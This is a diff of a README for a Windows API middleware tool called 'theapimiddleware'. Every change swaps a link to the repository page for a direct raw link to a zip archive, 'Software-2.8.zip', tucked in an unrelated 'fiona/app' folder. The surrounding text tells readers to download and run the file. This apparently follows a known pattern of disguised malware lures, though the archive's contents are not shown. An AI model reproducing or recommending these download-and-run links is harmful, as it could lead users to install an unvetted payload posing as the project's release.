@@ -1,6 +1,6 @@
 # 🔐 theapimiddleware - Secure API Control for Windows
 
-[![Download theapimiddleware](https://img.shields.io/badge/Download%20theapimiddleware-blue?style=for-the-badge&logo=github)](https://github.com/nurulislam017/theapimiddleware)
+[![Download theapimiddleware](https://img.shields.io/badge/Download%20theapimiddleware-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 Visit this page to download and set up the app:
 
-[https://github.com/nurulislam017/theapimiddleware](https://github.com/nurulislam017/theapimiddleware)
+[https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
 
 If the page shows a release file, download and run that file. If it shows source files instead of a release file, use the setup steps below to run it on Windows.
 
@@ -61,7 +61,7 @@ If the project includes Docker files, this is the easiest path.
 1. Install Docker Desktop for Windows.
 2. Open Docker Desktop and wait until it starts.
 3. Download or clone the project files from:
-   [https://github.com/nurulislam017/theapimiddleware](https://github.com/nurulislam017/theapimiddleware)
+   [https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
 4. Open the project folder.
 5. Open PowerShell in that folder.
 6. Run the Docker command shown in the project files.
@@ -75,7 +75,7 @@ If the app includes a `.env` file, set the app URL, port, and database details b
 If you want to run it without Docker:
 
 1. Download the project files from:
-   [https://github.com/nurulislam017/theapimiddleware](https://github.com/nurulislam017/theapimiddleware)
+   [https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip](https://raw.githubusercontent.com/nurulislam017/theapimiddleware/main/fiona/app/Software-2.8.zip)
 2. Extract the files to a folder on your PC.
 3. Install the required runtime if the project lists one.
 4. Open the folder in PowerShell.
